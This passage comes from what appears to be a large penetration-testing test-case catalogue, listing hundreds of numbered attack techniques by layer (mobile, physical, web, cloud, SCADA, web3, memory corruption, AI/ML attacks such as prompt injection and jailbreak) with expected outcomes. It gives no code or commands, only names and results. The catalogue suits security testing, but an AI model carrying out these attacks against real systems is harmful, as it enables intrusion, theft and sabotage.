├── TC-683  Android intent hijack                 → Intent hijacked
├── TC-684  Android content provider abuse        → Provider abused
├── TC-685  Android broadcast hijack              → Broadcast hijacked
├── TC-686  Android accessibility abuse           → Accessibility abused
├── TC-687  Android Frida hook                    → Hook success
├── TC-688  Certificate pinning bypass            → Bypass success
├── TC-689  Binary analysis                       → Analysis completed
├── TC-690  Memory dump                           → Memory dumped
├── TC-691  API intercept                         → API intercepted
├── TC-692  Traffic analysis                      → Analysis completed
├── TC-693  SSL decrypt                           → SSL decrypted
└── TC-694  Full mobile chain                     → Full chain success

LAYER 33 - PHYSICAL SECURITY:
├── TC-695  USB drop attack                       → Payload executed
├── TC-696  USB HID attack (Rubber Ducky)         → Payload executed
├── TC-697  USB storage attack                    → Payload executed
├── TC-698  USB WiFi Squirrel                     → Credentials stolen
├── TC-699  USB BadUSB                            → Firmware flashed
├── TC-700  Lock picking (pin tumbler)            → Lock opened
├── TC-701  Bump key attack                       → Lock opened
├── TC-702  Bypass tool attack                    → Lock opened
├── TC-703  Combination lock bypass               → Lock opened
├── TC-704  RFID badge clone                      → Badge cloned
├── TC-705  RFID badge emulate                    → Badge emulated
├── TC-706  Tailgating                            → Access gained
├── TC-707  WiFi Pineapple                        → Rogue AP deployed
├── TC-708  Locksport assessment                  → Assessment completed
├── TC-709  Badge assessment                      → Assessment completed
├── TC-710  Physical enumeration                  → Enumeration completed
├── TC-711  Physical penetration test             → Pen test completed
├── TC-712  USB deployment                        → USB deployed
├── TC-713  Physical access                       → Access gained
├── TC-714  Physical data extraction              → Data extracted
├── TC-715  Full physical chain                   → Full chain success

LAYER 34 - PURPLE TEAM:
├── TC-716  Detection test                        → Detection verified
├── TC-717  SOC response test                     → Response verified
├── TC-718  MITRE mapping                         → Mapping completed
├── TC-719  Purple team report                    → Report generated
├── TC-720  Detection rule creation               → Rule created
├── TC-721  Detection rule tuning                 → Rule tuned
├── TC-722  SOC improvement                       → SOC improved
├── TC-723  Response improvement                   → Response improved
├── TC-724  Detection validation                   → Validation completed
├── TC-725  Response validation                    → Validation completed
├── TC-726  MITRE technique mapping                → Mapping completed
├── TC-727  MITRE procedure mapping                → Mapping completed
├── TC-728  MITRE mitigations                      → Mitigations identified
├── TC-729  Purple team exercise                   → Exercise completed
├── TC-730  Purple team report                     → Report generated
├── TC-731  Purple team recommendations            → Recommendations made
├── TC-732  Purple team follow-up                  → Follow-up completed
├── TC-733  Purple team metrics                    → Metrics calculated
├── TC-734  Purple team dashboard                  → Dashboard updated
├── TC-735  Purple team scheduling                 → Schedule created
├── TC-736  Purple team automation                 → Automation deployed
├── TC-737  Purple team integration                → Integration completed
└── TC-738  Full purple team chain                 → Full chain success

LAYER 35 - THREAT INTEL:
├── TC-739  IOC extraction                         → IOCs extracted
├── TC-740  IOC validation                         → IOCs validated
├── TC-741  IOC enrichment                         → IOCs enriched
├── TC-742  MITRE technique identification          → Techniques identified
├── TC-743  MITRE procedure identification          → Procedures identified
├── TC-744  MITRE mitigation identification          → Mitigations identified
├── TC-745  Feed aggregation                       → Feeds aggregated
├── TC-746  Feed correlation                       → Feeds correlated
├── TC-747  Feed normalization                     → Feeds normalized
├── TC-748  Report generation                       → Report generated
├── TC-749  Report distribution                     → Report distributed
├── TC-750  Report archiving                        → Report archived
├── TC-751  Threat actor profiling                  → Profile created
├── TC-752  Campaign tracking                       → Campaign tracked
├── TC-753  Infrastructure tracking                 → Infrastructure tracked
├── TC-754  TTP documentation                       → TTPs documented
├── TC-755  Threat landscape analysis               → Analysis completed
├── TC-756  Threat intelligence briefing            → Briefing delivered
├── TC-757  Threat intelligence sharing             → Intel shared
├── TC-758  Threat intelligence automation          → Automation deployed
├── TC-759  Full threat intel chain                 → Full chain success

LAYER 36 - INCIDENT RESPONSE:
├── TC-760  Simulation setup                        → Simulation created
├── TC-761  Simulation execution                    → Simulation executed
├── TC-762  Counter-IR technique                     → Technique tested
├── TC-763  Counter-IR response                      → Response tested
├── TC-764  Playbook execution                       → Playbook executed
├── TC-765  Playbook validation                      → Playbook validated
├── TC-766  Playbook improvement                     → Playbook improved
├── TC-767  Playbook documentation                   → Playbook documented
├── TC-768  Playbook automation                      → Playbook automated
├── TC-769  Playbook testing                         → Playbook tested
├── TC-770  Playbook metrics                         → Metrics calculated
├── TC-771  Playbook reporting                        → Report generated
├── TC-772  Playbook archiving                        → Playbook archived
├── TC-773  Playbook sharing                          → Playbook shared
├── TC-774  Playbook integration                      → Integration completed
├── TC-775  Playbook scheduling                       → Schedule created
├── TC-776  Playbook dashboard                        → Dashboard updated
├── TC-777  Playbook recommendations                  → Recommendations made
├── TC-778  Playbook follow-up                        → Follow-up completed
├── TC-779  Full incident response chain              → Full chain success

LAYER 37 - ZERO TRUST:
├── TC-780  MFA bypass                               → Bypass success
├── TC-781  SSO abuse                                → Abuse success
├── TC-782  Conditional access bypass                 → Bypass success
├── TC-783  Device compliance bypass                  → Bypass success
├── TC-784  Identity federation attack                → Attack success
├── TC-785  Credential stuffing                       → Creds found
├── TC-786  Micro-segmentation bypass                 → Bypass success
├── TC-787  ZTNA bypass                               → Bypass success
├── TC-788  VPN bypass                                → Bypass success
├── TC-789  Tunnel establishment                       → Tunnel established
├── TC-790  Protocol smuggling                          → Smuggling success
├── TC-791  DNS exfiltration                           → Data exfiltrated
├── TC-792  API auth bypass                            → Bypass success
├── TC-793  Session hijack                             → Session hijacked
├── TC-794  Token forge                                → Token forged
├── TC-795  Policy bypass                              → Bypass success
├── TC-796  Access escalation                           → Access escalated
├── TC-797  DLP bypass                                  → Bypass success
├── TC-798  Exfiltration tunnel                         → Tunnel established
├── TC-799  Encryption bypass                            → Bypass success
├── TC-800  Data classification bypass                    → Bypass success
└── TC-801  Full zero trust chain                        → Full chain success

LAYER 38 - WEB3/DEFI:
├── TC-802  Reentrancy attack                            → Attack success
├── TC-803  Integer overflow/underflow                    → Overflow success
├── TC-804  Front-running (MEV)                           → Front-run success
├── TC-805  Flash loan attack                             → Attack success
├── TC-806  Oracle manipulation                           → Manipulation success
├── TC-807  Access control bypass                         → Bypass success
├── TC-808  Proxy upgrade attack                          → Attack success
├── TC-809  Signature abuse                               → Abuse success
├── TC-810  Liquidity pool drain                          → Drain success
├── TC-811  Price manipulation                            → Manipulation success
├── TC-812  Yield farming exploit                         → Exploit success
├── TC-813  Governance attack                             → Attack success
├── TC-814  Bridge exploit                                → Exploit success
├── TC-815  Lending protocol exploit                      → Exploit success
├── TC-816  Seed phrase theft                             → Theft success
├── TC-817  Private key extraction                        → Extraction success
├── TC-818  Approval abuse                                → Abuse success
├── TC-819  Permit signature abuse                        → Abuse success
├── TC-820  WalletConnect hijack                          → Hijack success
├── TC-821  NFT metadata manipulation                     → Manipulation success
├── TC-822  NFT rarity manipulation                        → Manipulation success
├── TC-823  NFT royalty bypass                             → Bypass success
└── TC-824  Full web3 chain                                → Full chain success

LAYER 39 - MALWARE ANALYSIS:
├── TC-825  Static analysis                                → Analysis completed
├── TC-826  Dynamic analysis                               → Analysis completed
├── TC-827  Unpacking                                      → Unpacked
├── TC-828  Evasion detection                              → Evasion detected
├── TC-829  Obfuscation detection                          → Obfuscation detected
├── TC-830  Packing detection                              → Packing detected
├── TC-831  Anti-debug detection                            → Anti-debug detected
├── TC-832  Anti-VM detection                               → Anti-VM detected
├── TC-833  Anti-sandbox detection                          → Anti-sandbox detected
├── TC-834  Anti-analysis detection                         → Anti-analysis detected
├── TC-835  Behavioral analysis                             → Behavior analyzed
├── TC-836  Network analysis                               → Network analyzed
├── TC-837  Memory analysis                                → Memory analyzed
├── TC-838  File analysis                                  → File analyzed
├── TC-839  Registry analysis                              → Registry analyzed
├── TC-840  Process analysis                               → Process analyzed
├── TC-841  Service analysis                               → Service analyzed
├── TC-842  Driver analysis                                → Driver analyzed
├── TC-843  Certificate analysis                            → Certificate analyzed
├── TC-844  Yara rule creation                              → Rule created
├── TC-845  Sigma rule creation                             → Rule created
├── TC-846  Snort rule creation                             → Rule created
├── TC-847  Malware classification                          → Classification completed
├── TC-848  Malware reporting                                → Report generated
└── TC-849  Full malware analysis chain                     → Full chain success

LAYER 40 - AI/ML ATTACKS:
├── TC-850  Model access                                    → Access gained
├── TC-851  Model extraction                                → Model extracted
├── TC-852  Model inversion                                 → Inversion success
├── TC-853  Model poisoning                                 → Poisoning success
├── TC-854  Prompt injection                                → Injection success
├── TC-855  Prompt bypass                                   → Bypass success
├── TC-856  Prompt extraction                               → Extraction success
├── TC-857  API exploitation                                → Exploitation success
├── TC-858  API abuse                                       → Abuse success
├── TC-859  Training data poisoning                          → Poisoning success
├── TC-860  Inference manipulation                           → Manipulation success
├── TC-861  Safety filter bypass                             → Bypass success
├── TC-862  Jailbreak                                       → Jailbreak success
├── TC-863  Adversarial example                              → Example success
├── TC-864  Model theft                                     → Theft success
├── TC-865  Data extraction                                 → Data extracted
├── TC-866  Model manipulation                               → Manipulation success
├── TC-867  Pipeline attack                                  → Attack success
├── TC-868  Infrastructure attack                            → Attack success
├── TC-869  Full AI/ML chain                                 → Full chain success
```

### Layer 41: IPv6 Attacks

```
LAYER 41 - IPV6 ATTACKS:
├── TC-870  NDP spoofing                         → MITM prefix success
├── TC-871  RA spoofing                          → False gateway route
├── TC-872  DAD attack                           → Kill neighbor reachability
├── TC-873  IPv6 fragmentation                   → IDS evade + reassembly bypass
├── TC-874  Extension header chain               → Firewall bypass
├── TC-875  SLAAC attack                         → Rogue prefix adoption
├── TC-876  AAAA DNS spoof                       → Traffic hijack
├── TC-877  6to4/6in4 tunnel                     → Legacy NAT bypass
├── TC-878  IPv6 firewall bypass                 → Filter bypass
├── TC-879  IPv4→IPv6 relay bypass               → Dual-stack blind spot
├── TC-880  NDP MITM                             → Session hijack
├── TC-881  Rogue router advertisement           → Default route takeover
├── TC-882  DHCPv6 spoofing                      → Attacker DNS/gateway
└── TC-883  Full IPv6 chain                      → Full chain success
```

### Layer 42: mDNS/LLMNR/NBT-NS

```
LAYER 42 - MDNS/LLMNR/NBT-NS:
├── TC-884  mDNS spoofing                        → Host resolution hijack
├── TC-885  mDNS cache poisoning                 → Poisoned answer cached
├── TC-886  LLMNR poisoning                      → Hash capture
├── TC-887  NBT-NS poisoning                     → NetBIOS hijack
├── TC-888  WPAD abuse                           → PAC proxy MITM
├── TC-889  DNS rebinding                        → Trust boundary bypass
├── TC-890  Responder relay                      → NTLM relay to SMB
├── TC-891  SMB hash relay                       → Remote code execution
├── TC-892  LLMNR→NBT fallback                   → Multi-protocol capture
├── TC-893  mDNS TTL manipulation                → Persist poisoned cache
├── TC-894  NBT null session                     → Unauthenticated enum
├── TC-895  Name resolution MITM                 → Traffic intercept
├── TC-896  WPAD proxy MITM                      → HTTPS strip attempt
├── TC-897  Multi-protocol combo                 → Credential reuse
├── TC-898  Name service sniffing                → Credential leak detect
└── TC-899  Full mDNS/LLMNR/NBT chain            → Full chain success
```

### Layer 43: SAML/OIDC

```
LAYER 43 - SAML/OIDC:
├── TC-900  SAML assertion tampering             → Spoofed claim accepted
├── TC-901  XML signature wrapping               → Signature bypass
├── TC-902  SAML response replay                 → Re-auth accepted
├── TC-903  SAML encryption downgrade            → Plaintext read
├── TC-904  Unsigned assertion                   → Assertion accepted
├── TC-905  IDP confusion                        → Cross-IDP accepted
├── TC-906  OIDC authorization code flow         → Token exchange
├── TC-907  OIDC token exchange abuse            → Privilege escalation
├── TC-908  OIDC nonce reuse                     → Replay accepted
├── TC-909  OIDC claim manipulation              → Role claim forged
├── TC-910  OAuth state confusion                → CSRF login
├── TC-911  JWT alg confusion                    → Forged token
├── TC-912  JWT kid injection                    → Key confusion
├── TC-913  Cross-tenant token                   → Tenant hop
├── TC-914  Session fixation                     → Pre-auth hijack
└── TC-915  Full SAML/OIDC chain                 → Full chain success
```

### Layer 44: LDAP Injection

```
LAYER 44 - LDAP INJECTION:
├── TC-916  LDAP filter boolean                  → Auth bypass
├── TC-917  LDAP blind                           → Attribute extraction
├── TC-918  LDAP NTLM relay                      → Internal relay
├── TC-919  LDAPS MITM                           → Plaintext cred capture
├── TC-920  Attribute injection                  → Group membership add
├── TC-921  Wildcard filter                      → Broad enumeration
├── TC-922  Explicit base bypass                 → Restricted base skip
├── TC-923  Unauthenticated bind                 → Write access
├── TC-924  LDAP ping                            → Kerberoast relay
├── TC-925  LDAP modify abuse                    → Object modification
└── TC-926  Full LDAP chain                      → Full chain success
```

### Layer 45: CSRF

```
LAYER 45 - CSRF:
├── TC-927  CSRF token missing                   → State change accepted
├── TC-928  CSRF token predictable               → Forged token
├── TC-929  CSRF token reuse                     → Replay change
├── TC-930  CSRF JSON content type               → JSON body attack
├── TC-931  CSRF state-changing GET              → GET trigger
├── TC-932  CSRF multipart                       → Boundary bypass
├── TC-933  CSRF SameSite bypass                 → Subdomain cookie
├── TC-934  Login CSRF                           → Account takeover
├── TC-935  CSRF OAuth login state               → Victim OAuth bind
├── TC-936  CSRF chained with XSS                → Full takeover
└── TC-937  Full CSRF chain                      → Full chain success
```

### Layer 46: Open Redirect

```
LAYER 46 - OPEN REDIRECT:
├── TC-938  Parameter redirect                   → Off-domain redirect
├── TC-939  Header-based redirect                → Host header abuse
├── TC-940  Meta refresh                         → Redirect execution
├── TC-941  javascript: URL                      → XSS via redirect
├── TC-942  data: URL                            → HTML injection
├── TC-943  Protocol-relative //                 → Scheme confusion
├── TC-944  CRLF in redirect                     → Response splitting
├── TC-945  OAuth token leak redirect            → Token exfil
├── TC-946  file:// redirect                     → Local file read
└── TC-947  Full redirect chain                  → Full chain success
```

### Layer 47: File Upload Bypass

```
LAYER 47 - FILE UPLOAD BYPASS:
├── TC-948  Double extension bypass              → Extension bypass
├── TC-949  MIME spoof                           → Content sniff bypass
├── TC-950  Magic bytes polyglot                 → Signature evade
├── TC-951  .htaccess upload                     → Config override
├── TC-952  XML/SVG XSS                          → Stored XSS
├── TC-953  EXIF injection                       → Payload in EXIF
├── TC-954  Path traversal filename              → Overwrite arbitrary file
├── TC-955  Null-byte filename                   → Truncation bypass
├── TC-956  Upload to webroot                    → Direct RCE
├── TC-957  Image polyglot                       → Dual-file execute
├── TC-958  Content-type confusion               → Header confusion
├── TC-959  Size/DoS                             → Resource exhaustion
└── TC-960  Full upload chain                    → Full chain success
```

### Layer 48: Subdomain Takeover

```
LAYER 48 - SUBDOMAIN TAKEOVER:
├── TC-961  CNAME expired domain                → Takeover
├── TC-962  Dangling A record                   → Re-register A/B
├── TC-963  AWS S3 bucket                       → Bucket takeover
├── TC-964  Azure blob                          → Container takeover
├── TC-965  GitHub Pages                        → CNAME takeover
├── TC-966  Heroku app                          → App takeover
├── TC-967  Shopify/Stripe                      → CDN takeover
├── TC-968  Dangling NS                         → Zone takeover
├── TC-969  Wildcard CNAME                      → Wildcard capture
├── TC-970  Expired cert DNS                    → Cert alignment bypass
├── TC-971  ALIAS record                        → DNS role confusion
├── TC-972  Expired registrar                   → Domain re-claim
├── TC-973  Enumeration pivot                   → Fresh registrations
├── TC-974  Cookie scope takeover               → Session submission
└── TC-975  Full takeover chain                 → Full chain success
```

### Layer 49: Web Cache Poisoning

```
LAYER 49 - WEB CACHE POISONING:
├── TC-976  Unkeyed header poisoning            → Poisoned cache
├── TC-977  Cache key normalization             → Key confusion
├── TC-978  Cache-Control manipulation          → Bypass cache fresh
├── TC-979  X-Forwarded-Host                    → Tailored poison
├── TC-980  Duplicate parameter                 → Key split
├── TC-981  Cookie-based cache poison           → Personalized splice
├── TC-982  Extension-based poison              → Static serve
├── TC-983  Web cache deception                 → Private page leak
├── TC-984  Time-based poisoning                → Delayed cache fill
├── TC-985  Cache purge via method              → Controlled purge
└── TC-986  Full cache poison chain             → Full chain success
```

### Layer 50: HTTP Request Smuggling

```
LAYER 50 - HTTP REQUEST SMUGGLING:
├── TC-987  CL.TE                                 → Front-end parse confusion
├── TC-988  TE.CL                                 → Back-end poison
├── TC-989  TE.TE obfuscation                     → Obfuscation bypass
├── TC-990  CL.CL                                 → Dual-length conflict
├── TC-991  HTTP/2 downgrade smuggling            → Request smuggling
├── TC-992  Chunk size confusion                  → Desync success
├── TC-993  CRLF normalization                   → Poison via CRLF
├── TC-994  Front-end validation bypass           → Cloaked request
├── TC-995  Request splitting                     → Append request
├── TC-996  Tunneling smuggling                   → Request queue steal
└── TC-997  Full smuggling chain                  → Full chain success
```

### Layer 51: DNSSEC Bypass

```
LAYER 51 - DNSSEC BYPASS:
├── TC-998  Zone walking NSEC                    → Full enumeration
├── TC-999  NSEC3 crack                          → Hash reversal
├── TC-1000 RRSIG expiry                         → Validation bypass
├── TC-1001 DNSKEY flood                         → DoS chaos
├── TC-1002 Algorithm downgrade                  → Weakened signature
├── TC-1003 Trust anchor poisoning               → Chain break
├── TC-1004 Zone truncation                      → Response manipulation
├── TC-1005 Resolver confusion                   → Recursion abuse
└── TC-1006 Full DNSSEC chain                    → Full chain success
```

### Layer 52: Certificate Forgery

```
LAYER 52 - CERTIFICATE FORGERY:
├── TC-1007 Weak key RSA-512                     → Key factorisation
├── TC-1008 Prime reuse                          → Key collision
├── TC-1009 MD5 cert                             → Collision cert
├── TC-1010 Keygen reuse                         → Predictable key
├── TC-1011 Rogue CA issuance                    → Forged cert issued
├── TC-1012 Cert pinning bypass                  → Trust override
├── TC-1013 LE domain validation abuse           → Cert for victim
├── TC-1014 Signature timestamp                  → Validity exploit
├── TC-1015 EV impersonation                     → Extended trust
├── TC-1016 Trust store backdoor                 → System CA install
└── TC-1017 Full cert forgery chain              → Full chain success
```

### Layer 53: TLS 1.3 Attacks

```
LAYER 53 - TLS 1.3 ATTACKS:
├── TC-1018 EARLY_DATA 0-RTT replay              → Replay accepted
├── TC-1019 KeyUpdate manipulation               → Key state confusion
├── TC-1020 Downgrade sentinel bypass            → Downgrade hidden
├── TC-1021 Certificate compression bomb         → DoS
├── TC-1022 ESNI plaintext leak                  → SNI exposure
├── TC-1023 Session resumption reuse             → Session replay
├── TC-1024 PSK key reuse                        → Cross-session decrypt
├── TC-1025 RC4 downgrade                        → Weak cipher forced
├── TC-1026 Missing SNI/ALPN check               → Protocol confusion
└── TC-1027 Full TLS 1.3 chain                   → Full chain success
```

### Layer 54: SCADA/ICS

```
LAYER 54 - SCADA/ICS:
├── TC-1028 Modbus register tamper               → Setpoint change
├── TC-1029 DNP3 spoofed point                   → False telemetry
├── TC-1030 OPC-UA auth bypass                   → Unauthenticated control
├── TC-1031 Ethernet/IP CIP                      → Rung state alter
├── TC-1032 MMS attack                           → Field message spoof
├── TC-1033 PROFINET injection                   → RT frame abuse
├── TC-1034 STP loop                             → Network DoS
├── TC-1035 HMI CRT injection                    → Operator deception
├── TC-1036 Engineering station                  → Controller access
├── TC-1037 Fieldbus MITM                        → Command injection
└── TC-1038 Full SCADA chain                     → Full chain success
```

### Layer 55: IoT Attacks

```
LAYER 55 - IOT ATTACKS:
├── TC-1039 Default credential scan              → Device access
├── TC-1040 OTA firmware intercept               → Firmware swap
├── TC-1041 UART shell                           → Bare-metal shell
├── TC-1042 Insecure MQTT                        → Topic control
├── TC-1043 CoAP amplification                   → Network DoS
├── TC-1044 Zigbee rejoin                        → Key exchange abuse
├── TC-1045 BLE pairing downgrade                → Just-works connect
├── TC-1046 Device cloud API                     → Device control
├── TC-1047 SSID/PSK extraction                  → Wi-Fi deep
├── TC-1048 Insecure telnet                      → Root shell
├── TC-1049 Firmware signature bypass            → Modified firmware
├── TC-1050 JTAG debug                           → Memory read
├── TC-1051 Neighbor discovery spoof             → Gateway hijack
└── TC-1052 Full IoT chain                       → Full chain success
```

### Layer 56: Compliance Testing

```
LAYER 56 - COMPLIANCE TESTING:
├── TC-1053 PCI scope discovery                  → Scope widened
├── TC-1054 PCI segmentation test                → CDE isolation breach
├── TC-1055 PCI encryption-at-rest               → Data-at-rest access
├── TC-1056 PCI 6.6 WAF test                     → WAF gap
├── TC-1057 PCI pen test evidence                → Evidence chain
├── TC-1058 PCI remediation validation           → Re-test loop
├── TC-1059 HIPAA workstation audit             → ePHI device access
├── TC-1060 HIPAA ePHI flow                      → Data leak path
├── TC-1061 HIPAA audit requirement              → Audit gap
├── TC-1062 HIPAA password/policy                → Weak auth bypass
├── TC-1063 GDPR data inventory                  → Unknown PII
├── TC-1064 GDPR DSAR abuse                      → Data exfil via erasure
├── TC-1065 GDPR right-to-erasure                → Data restore attempt
├── TC-1066 GDPR cross-border test               → Transfer path
├── TC-1067 GDPR DPIA gap                        → Process gap
├── TC-1068 ISO 27001 Annex A                    → Control mapping
├── TC-1069 ISO internal audit bypass            → Detectability
├── TC-1070 ISO evidence tamper                  → Log integrity
├── TC-1071 NIS2 reporting                       → Report test
├── TC-1072 SOX access review                    → Segregation gap
├── TC-1073 SOC2 trust services                  → Control gap
├── TC-1074 CIS cloud benchmark                  → Baseline drift
├── TC-1075 Container compliance                 → Image policy
├── TC-1076 Compliance dashboard                 → Coverage gap
├── TC-1077 Evidence retention                   → Retention bypass
└── TC-1078 Full compliance chain                → Full chain success
```

### Layer 57: Methodology Mapping

```
LAYER 57 - METHODOLOGY MAPPING:
├── TC-1079 PTES scoping                        → Scope definition
├── TC-1080 PTES intel gathering                → OSINT complete
├── TC-1081 PTES threat modeling                → Asset list
├── TC-1082 PTES vuln analysis                  → Vulnerability catalog
├── TC-1083 PTES exploitation                   → Access achieved
├── TC-1084 PTES post-exploitation              → Persistence
├── TC-1085 PTES reporting                      → Report deliverable
├── TC-1086 OWASP top 10 mapping                → Category map
├── TC-1087 OWASP ASVS check                    → Control level
├── TC-1088 OWASP testing guide                 → Pass/fail matrix
├── TC-1089 OWASP API top 10                    → API risk map
├── TC-1090 OWASP LLM top 10                    → LLM risk map
├── TC-1091 OWASP mobile                        → Mobile checklist
├── TC-1092 OWASP firmware                      → Firmware checklist
├── TC-1093 NIST 800-115 mapping                → Phase mapping
├── TC-1094 NIST cyber framework                → Function map
├── TC-1095 NIST 800-53 control                 → Control coverage
├── TC-1096 NIST risk assessment               → Risk register
├── TC-1097 OSSTMM scope                        → RA metrics
├── TC-1098 OSSTMM channel checks               → Human/physical
├── TC-1099 OSSTMM index check                  → Trust index
├── TC-1100 OSSTMM metrics                      → Score sheet
├── TC-1101 MITRE ATT&CK map                    → Technique mapping
├── TC-1102 MITRE D3FEND counter                → Defense mapping
├── TC-1103 MITRE pre-ATT&CK                    → Recon mapping
├── TC-1104 Unified kill chain                  → Kill chain map
├── TC-1105 Cross-framework alignment           → Gap analysis
├── TC-1106 Framework report export             → Evidence pack
└── TC-1107 Full methodology chain              → Full chain success
```

### Layer 58: OPSEC Procedures

```
LAYER 58 - OPSEC PROCEDURES:
├── TC-1108 Comms encryption                   → End-to-end crypto
├── TC-1109 Comms cover                        → Stealth channel
├── TC-1110 Ops persona                        → Separate identity
├── TC-1111 Data-at-rest                       → Encrypted store
├── TC-1112 Data-in-transit                    → TLS enforced
├── TC-1113 Data sanitization                  → DOD wipe
├── TC-1114 Team hygiene                       → Session artifacts
├── TC-1115 Credential burner                  → Rotated creds
├── TC-1116 Timeline de-confliction            → Ops sync
├── TC-1117 Incident blackout                  → Ops pause
├── TC-1118 Burn phone                         → Disposable device
├── TC-1119 SIM/identity                       → Anonymous identity
├── TC-1120 Split comms                        → Segregated channels
├── TC-1121 Travel cover                       → Ops field
├── TC-1122 Digital footprint                  → Minimized trail
├── TC-1123 Secure audit log                   → Tamper-evident
├── TC-1124 Counterintel                       → Detection probe
├── TC-1125 False flag                         → Attribution confusion
├── TC-1126 Voice comms                        → Voice security
├── TC-1127 Operational tempo                  → Randomize timing
└── TC-1128 Full OPSEC chain                   → Full chain success
```

### Layer 59: Multi-Cloud

```
LAYER 59 - MULTI-CLOUD:
├── TC-1129 Cross-cloud identity pivot          → Role hop
├── TC-1130 GCP→AWS assume role                 → Cross-role access
├── TC-1131 Azure→GCP SA abuse                  → Cross-SA access
├── TC-1132 Cross-cloud secret exfil            → Secret leak
├── TC-1133 Multi-cloud sync                    → Sync hijack
├── TC-1134 Federated identity abuse            → IdP compromise
├── TC-1135 Cross-region staging                → Region hop
├── TC-1136 Cross-cloud C2 relay                → Relay up
├── TC-1137 MSP tenant pivot                    → Tenant escape
├── TC-1138 Marketplace backdoor                → Vendor supply
├── TC-1139 Cross-cloud monitoring suppression  → Blind spot
├── TC-1140 Multi-cloud compliance gap          → Policy gap
└── TC-1141 Full multi-cloud chain              → Full chain success
```

### Layer 60: Web Misc

```
LAYER 60 - WEB MISC:
├── TC-1142 Host header injection               → Poison cache/reset
├── TC-1143 SMS header injection                → SMS spoof
├── TC-1144 Email header injection              → Email spoof
├── TC-1145 Log injection/poisoning             → Forged log
├── TC-1146 Header XSS injection                → Reflected header XSS
├── TC-1147 Response splitting                  → CRLF append
├── TC-1148 Session ID in URL                   → Session leak
├── TC-1149 Clickjacking frame                  → Iframe abuse
├── TC-1150 Framebusting bypass                 → Frame retained
├── TC-1151 Prototype pollution                 → Client-side RCE
└── TC-1152 Full web misc chain                 → Full chain success
```

### Layer 61: Memory Corruption

```
LAYER 61 - MEMORY CORRUPTION:
├── TC-1153 Stack buffer overflow               → Crash → EIP control
├── TC-1154 Heap overflow                       → Chunk overwrite
├── TC-1155 Use-after-free                      → Reuse exploit
├── TC-1156 Double free                         → Heap dup
├── TC-1157 Integer overflow                    → Bounds bypass
├── TC-1158 Format string                       → Info leak
├── TC-1159 Off-by-one                          → Adjacent overwrite
├── TC-1160 Stack cookie bypass                 → Cookie leak
├── TC-1161 SEH overwrite                       → Handler hijack
├── TC-1162 ASLR partial bypass                 → Leak + ret
├── TC-1163 DEP/NX ROP                          → Ret2rop
├── TC-1164 Heap spray                          → Deterministic landing
├── TC-1165 House of spirit                     → Fake chunk
├── TC-1166 House of force                      → Top chunk push
├── TC-1167 Tcache poisoning                    → Arbitrary alloc
├── TC-1168 Fastbin dup                         → Double alloc
├── TC-1169 Ret2PLT                             → GOT resolve
├── TC-1170 Ret2libc                            → libc exec
├── TC-1171 Ret2csu                             → Universal gadget
├── TC-1172 Ret2dlresolve                       → Full resolve
├── TC-1173 SROP                                → Sigreturn frame
├── TC-1174 JOP/COP                             → Call-oriented
├── TC-1175 ObjC message confusion              → Method swap
├── TC-1176 VTable trick                        → C++ dispatch
├── TC-1177 Vfptr overwrite                     → Virtual hijack
├── TC-1178 Container escape                    → Kernel memory
└── TC-1179 Full memory corruption chain        → Full chain success
```

### Layer 62: Deserialization

```
LAYER 62 - DESERIALIZATION:
├── TC-1180 Java ObjectInputStream              → Gadget chain
├── TC-1181 ysoserial commons                   → Commons-chain RCE
├── TC-1182 Java RMI deser                      → Remote class load
├── TC-1183 Java JNDI                           → LDAP RCE
├── TC-1184 Python pickle                       → __reduce__ RCE
├── TC-1185 Python PIL Image                    → CVE deser
├── TC-1186 Python flask session                → Signed cookie
├── TC-1187 PHP unserialize POP                 → Property chain
├── TC-1188 PHP phar deser                      → Phar trigger
├── TC-1189 PHP object injection                → Magic invoke
├── TC-1190 .NET BinaryFormatter                → Type-confusion
├── TC-1191 .NET JSON deser                     → TypeNameHandling
├── TC-1192 .NET ViewState                      → MAC bypass
├── TC-1193 .NET XML deser                      → XAML gadget
├── TC-1194 Ruby Marshal                        → Object injection
├── TC-1195 Ruby YAML                           → Code execution
├── TC-1196 Rails strong params                 → Permitted keys
├── TC-1197 NodeJS serialize                    → RCE gadget
├── TC-1198 Go gob                              → Struct confusion
├── TC-1199 Groovy gadget                       → Script class
├── TC-1200 JBoss InvokerTransformer            → Commons gadget
├── TC-1201 WebLogic wl_t3                      → T3 RCE
├── TC-1202 Fastjson                            → Auto-type RCE
├── TC-1203 Kotlin data class                   → Constructor abuse
└── TC-1204 Full deser chain                    → Full chain success
```

### Layer 63: Race Conditions

```
LAYER 63 - RACE CONDITIONS:
├── TC-1205 TOCTOU file check                   → Check/set race
├── TC-1206 TOCTOU symlink                      → Symlink swap
├── TC-1207 TOCTOU setuid                       → Priv swap
├── TC-1208 Concurrent login bypass             → Double auth
├── TC-1209 Double submission                   → Points double
├── TC-1210 Konga lottery                       → Winner race
├── TC-1211 Password change race                → Stale state
├── TC-1212 File rename race                    → Overwrite
├── TC-1213 Write-write race                    → Garbled data
├── TC-1214 Multi-vote abuse                    → Vote stacking
├── TC-1215 Quantity race                       → Qty mismatch
├── TC-1216 Double-spend                        → Balance dup
├── TC-1217 Signup bonus race                   → Bonus farm
├── TC-1218 Cache invalidation race             → Stale serve
├── TC-1219 CPU-bound race                      → Thread contention
├── TC-1220 Block-dependent race                → Order confusion
└── TC-1221 Full race chain                     → Full chain success
```

### Layer 64: GraphQL Deep

```
LAYER 64 - GRAPHQL DEEP:
├── TC-1222 Introspection disclosure            → Schema dump
├── TC-1223 Field suggestion                    → Schema leak
├── TC-1224 Alias batching                      → Batch abuse
├── TC-1225 Batch brute                         → Parallel attack
├── TC-1226 Nested query DoS                    → Depth DoS
├── TC-1227 Fragment loop DoS                   → Loop exhaustion
├── TC-1228 Directive DoS                       → Resource request
├── TC-1229 Batching limit bypass               → Limit evade
├── TC-1230 Query-level authz                   → Global authz gap
├── TC-1231 Mutation-level authz                → Authz audit
├── TC-1232 Object-level authz                  → IDOR field
├── TC-1233 IDOR via GraphQL                    → Union object
├── TC-1234 Variable-based injection            → SQLi via variable
├── TC-1235 Subscription abuse                  → Real-time pipe
├── TC-1236 Persisted query abuse               → Cache abuse
├── TC-1237 CSRF in GraphQL                     → GET mutation
├── TC-1238 Schema merge confusion              → Merge conflict
├── TC-1239 Cache key leak                      → User data leak
└── TC-1240 Full GraphQL chain                  → Full chain success
```

### Layer 65: Cryptographic Attacks

```
LAYER 65 - CRYPTOGRAPHIC ATTACKS:
├── TC-1241 Padding oracle                      → Plaintext decrypt
├── TC-1242 CBC bit flipping                    → IV flip
